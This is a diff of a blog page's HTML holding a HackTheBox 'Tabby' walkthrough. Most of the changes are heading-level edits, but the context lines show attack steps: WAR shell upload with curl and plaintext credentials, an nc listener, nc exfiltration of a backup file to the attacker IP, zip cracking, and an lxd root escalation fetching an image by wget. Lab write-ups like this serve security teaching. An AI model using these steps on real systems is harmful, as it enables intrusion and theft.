@@ -54,11 +54,11 @@ Contact Me
 <div class="row justify-content-center">
 <div class=col-lg-8>
 <article class=site-blog-details>
-<p><span>September 25, 2020</span> by <span>Nasef</span></p>
 <h2 class=blog-title>Tabby HackTheBox Walkthrough</h2>
+<p><span>September 25, 2020</span> by <span>Nasef</span></p>
 <img class=feature-image src=https://iamnasef.com/images/blog/008/featured-image.png alt=blog-feature-image>
 <p>Tabby is a machine in which I used Local File Inclusion to get tomcat credintials to obtain shell access and then used enumeration and lxd to get root Access.</p>
-<h2 id=recon>Recon</h2>
+<h3 id=recon>Recon</h3>
 <p>As always, I started scanning with Nmap</p>
 <pre><code>kali@kali:~$ nmap -sC -sV 10.10.10.194
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-30 08:01 EDT
@@ -80,7 +80,7 @@ Nmap done: 1 IP address (1 host up) scanned in 30.32 seconds
 
 
 </code></pre><p>Two HTTP Services one of them is tomcat and a ssh service .</p>
-<h2 id=exploitation>Exploitation</h2>
+<h3 id=exploitation>Exploitation</h3>
 <p>First I opened the 80 service and inspected element and found this suspeciouc url</p>
 <pre><code>http://megahosting.htb/news.php?file=statement
 </code></pre><p>I tested for</p>
@@ -103,17 +103,17 @@ Nmap done: 1 IP address (1 host up) scanned in 30.32 seconds
 root@kali:/home/kali/Desktop/tabby# curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war &quot;http://10.10.10.194:8080/manager/text/deploy?path=/shell.war&quot;
 root@kali:/home/kali# nc -lvnp 9999
 listening on [any] 9999 ...
-</code></pre><h2 id=from-tomcat-to-ash>From Tomcat to Ash</h2>
+</code></pre><h3 id=from-tomcat-to-ash>From Tomcat to Ash</h3>
 <p>And got the shell. After Enumeration I found a backup file in /var/www/html/files/16162020_backup.zip. So I downloaded it using nc</p>
-<h3 id=target>Target</h3>
+<h5 id=target>Target</h5>
 <pre><code>nc -w 3 10.10.14.110 1234 &lt; 16162020_backup.zip
-</code></pre><h3 id=hacker>Hacker</h3>
+</code></pre><h5 id=hacker>Hacker</h5>
 <pre><code>nc -l -p 1234 &gt; file.zip
 </code></pre><p>Then I used fcrackzip to crack the file and found the password</p>
-<h3 id=hacker-1>Hacker</h3>
+<h5 id=hacker-1>Hacker</h5>
 <pre><code>root@kali:/home/kali/Desktop/tabby2# fcrackzip -D -p /usr/share/wordlists/rockyou.txt file.zip 
 possible pw found: admin@it ()                                                                                    
-</code></pre><h3 id=target-1>Target</h3>
+</code></pre><h5 id=target-1>Target</h5>
 <pre><code>tomcat@tabby:/home$ su ash                                                                                        
 su ash                                                                                                            
 Password: admin@it                                                                                                
@@ -122,9 +122,9 @@ ash@tabby:/home$ id
 id                                                                                                                
 uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)                        
 </code></pre><p>and admin@it was the password for ash.</p>
-<h2 id=from-ash-to-root>From Ash to Root</h2>
+<h3 id=from-ash-to-root>From Ash to Root</h3>
 <p>After the id command I found an Intersteing thing (lxd). I searched for privlige Esuclation using lxd and found one</p>
-<h3 id=hacker-2>Hacker</h3>
+<h5 id=hacker-2>Hacker</h5>
 <pre><code>root@kali:/home/kali/Desktop/tabby2# git clone  https://github.com/saghul/lxd-alpine-builder.git
 Cloning into 'lxd-alpine-builder'...
 .....
@@ -133,7 +133,7 @@ root@kali:/home/kali/Desktop/tabby2/lxd-alpine-builder# python -m SimpleHTTPServ
 Serving HTTP on 0.0.0.0 port 5555 ...
 10.10.10.194 - - [30/Sep/2020 08:19:08] &quot;GET /alpine-v3.12-x86_64-20200930_0818.tar.gz HTTP/1.1&quot; 200 -
                                                                    
-</code></pre><h3 id=target-2>Target</h3>
+</code></pre><h5 id=target-2>Target</h5>
 <pre><code>ash@tabby:/home$ cd ash
 cd ash
 ash@tabby:~$ wget http://10.10.14.110:5555/alpine-v3.12-x86_64-20200930_0818.tar.gz
